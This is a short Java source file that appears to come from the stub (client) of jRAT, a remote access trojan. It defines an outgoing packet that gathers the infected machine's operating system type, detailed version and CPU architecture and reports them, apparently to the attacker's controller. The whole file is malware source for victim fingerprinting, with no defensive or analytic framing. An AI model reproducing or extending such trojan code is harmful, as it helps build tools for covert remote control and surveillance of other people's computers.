package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;

import com.redpois0n.oslib.AbstractOperatingSystem;
import com.redpois0n.oslib.Arch;
import com.redpois0n.oslib.OperatingSystem;

public class Packet16InitOperatingSystem extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
		
		sw.writeLine(os.getType().getName());
		sw.writeLine(os.getDetailedString());
		sw.writeLine(Arch.getStringFromArch());
	}

	@Override
	public byte getPacketId() {
		return (byte) 16;
	}
}
